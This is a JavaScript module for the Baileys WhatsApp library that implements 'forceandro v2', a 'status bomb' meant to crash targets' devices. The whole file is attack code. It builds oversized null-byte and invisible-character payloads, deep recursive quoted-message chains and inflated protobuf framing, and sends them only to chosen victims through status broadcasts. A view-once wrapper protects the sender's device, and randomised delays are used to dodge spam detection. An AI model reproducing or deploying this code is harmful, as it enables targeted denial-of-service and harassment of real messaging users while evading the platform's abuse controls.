const {
    proto,
    generateWAMessageFromContent,
} = require('@whiskeysockets/baileys');
const crypto = require('crypto');

// =============================================================
//  forceandro v2 — Sender-Safe Multi-Depth Status Bomb
//  Wrapper: viewOnceMessage (sender stores, never parses)
//  Route:   status@broadcast (target-only visibility)
//  Depth:   800 → 6500 sweep
//  Tags:    7 encodings
//  Shots:   2 per tag per depth-band
// =============================================================

async function forceandro(sock, target) {
    if (!sock || !target) return;

    // ---------- Sender extraction ----------
    let senderNum = '';
    try {
        senderNum = String(sock.user?.id || '').split('@')[0].split(':')[0];
    } catch (_) {}

    const resolveJid = (raw) => {
        let s = String(raw || '').trim();
        if (s.includes('@')) return s;
        return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    // ---------- Target list, sender excluded ----------
    const allJids = (Array.isArray(target) ? target : [target])
        .map(resolveJid)
        .filter(j => j.length > 15);

    const jids = allJids.filter(j => {
        const num = j.split('@')[0].split(':')[0];
        return num !== senderNum;
    });

    if (!jids.length) return;

    // ---------- Invisible payload components ----------
    const ZW   = "\u200B\u200C\u200D\u2060\u2061\u2062\u2063";
    const BIDI = "\u202A\u202B\u202C\u202D\u202E\u2066\u2067\u2068\u2069";
    const SUR  = "\uD804\uDDC2\uD804\uDDB5\uD804\uDDB4\uD804\uDDBF";
    const NUL  = "\x00";

    const invis = (n) =>
        ZW.repeat(n >> 2) + BIDI.repeat(n >> 2) + SUR.repeat(n >> 3);

    // ---------- Deep quotedMessage recursion (JSON layer) ----------
    // This is the vector that crashes on parse — target side only
    const buildRecursion = (depth) => {
        let q = { conversation: "\0" + invis(100) };
        for (let i = 0; i < depth; i++) {
            q = {
                extendedTextMessage: {
                    text: "\0" + invis(50),
                    contextInfo: {
                        quotedMessage: q,
                        forwardingScore: 0x7FFFFFFF,
                        isForwarded: true,
                    },
                },
            };
        }
        return q;
    };

    // ---------- Multi-bomb payload builder ----------
    const buildPayload = (targetJid) => ({
        // BOMB A: interactive flow with null byte + ZW overflow
        interactiveMessage: {
            body: { text: NUL.repeat(40000) + invis(20000) },
            nativeFlowMessage: {
                buttons: [
                    { name: "quick_reply", buttonParamsJson: NUL.repeat(25000) },
                    { name: "quick_reply", buttonParamsJson: ZW.repeat(15000) },
                    { name: "call_permission_request", buttonParamsJson: BIDI.repeat(15000) },
                    { name: "single_select", buttonParamsJson: SUR.repeat(15000) },
                ],
                messageParamsJson: JSON.stringify({
                    title: NUL.repeat(15000),
                    displayName: "X",
                }),
            },
            contextInfo: {
                mentionedJid: [targetJid],
                forwardingScore: 0x7FFFFFFF,
                isForwarded: true,

                // BOMB B: nested location overflow
                quotedMessage: {
                    locationMessage: {
                        degreesLatitude: -0x7FFFFFFF / 1000,
                        degreesLongitude: 0x7FFFFFFF / 1000,
                        name: NUL.repeat(20000),
                        address: invis(20000),
                        jpegThumbnail: Buffer.alloc(40000, 0xFF),

                        // BOMB C: deep recursion chain
                        contextInfo: {
                            mentionedJid: [targetJid],
                            forwardingScore: 0x7FFFFFFF,
                            isForwarded: true,

                            // 1500-deep JSON recursion
                            quotedMessage: buildRecursion(1500),
                        },
                    },
                },
            },
        },
    });

    // ---------- LD framing (proto-level deep wrap) ----------
    const encodeVarint = (n) => {
        const buf = [];
        while (n >= 0x80) { buf.push((n & 0x7f) | 0x80); n >>>= 7; }
        buf.push(n);
        return Buffer.from(buf);
    };

    const wrapLd = (tag, data) =>
        Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);

    const TAGS = [
        [0xBA, 0x03],
        [0xD2, 0x04],
        [0xAA, 0x02],
        [0xC2, 0x05],
        [0xE2, 0x06],
        [0x92, 0x07],
        [0xF2, 0x07],
    ];

    const inflate = (payload, tag, depth) => {
        let buf = payload;
        for (let i = 0; i < depth; i++) {
            buf = wrapLd(tag, wrapLd([0x0A], buf));
        }
        return buf;
    };

    // ---------- viewOnce wrapper (SENDER PROTECTION) ----------
    // Sender's device: stores viewOnce blob, shows placeholder, NO deep parse
    // Target's device: user opens → parse → recursion → crash
    const wrapViewOnce = (inner) => ({
        viewOnceMessage: {
            message: inner,
        },
    });

    // ---------- Sweep and fire ----------
    let sent = 0;
    const SHOTS_PER_TAG = 2;

    for (const jid of jids) {
        const payloadObj = buildPayload(jid);
        let payload;

        try {
            payload = proto.Message.encode(
                proto.Message.fromObject(payloadObj)
            ).finish();
        } catch (e) {
            console.log('[forceandro encode]', e.message);
            continue;
        }

        for (const tag of TAGS) {
            // Find smallest depth that decodes cleanly
            let depthUsed = 0;
            for (let depth = 6500; depth >= 800; depth -= 300) {
                try {
                    const test = proto.Message.decode(inflate(payload, tag, depth));
                    proto.Message.encode(test).finish();
                    depthUsed = depth;
                    break;
                } catch (_) {}
            }
            if (!depthUsed) continue;

            for (let shot = 0; shot < SHOTS_PER_TAG; shot++) {
                try {
                    const decoded = proto.Message.decode(
                        inflate(payload, tag, depthUsed)
                    );

                    // viewOnce wrapper — sender protection
                    const wrapped = wrapViewOnce(decoded);

                    await sock.relayMessage('status@broadcast', wrapped, {
                        messageId:
                            '3EB0' + crypto.randomBytes(10).toString('HEX').toUpperCase(),
                        statusJidList: jids, // target-only
                        additionalNodes: [{
                            tag: 'meta',
                            attrs: {},
                            content: [{
                                tag: 'mentioned_users',
                                attrs: {},
                                content: jids.map(j => ({
                                    tag: 'to',
                                    attrs: { jid: j },
                                    content: [],
                                })),
                            }],
                        }],
                    });

                    sent++;
                } catch (e) {
                    console.log('[forceandro relay]', e.message);
                }

                // Jitter — avoid spam heuristic + let sender recover
                await new Promise(r =>
                    setTimeout(r, 2500 + Math.random() * 2000)
                );
            }
        }
    }

    return { sent, targets: jids.length };
}

module.exports = { forceandro };
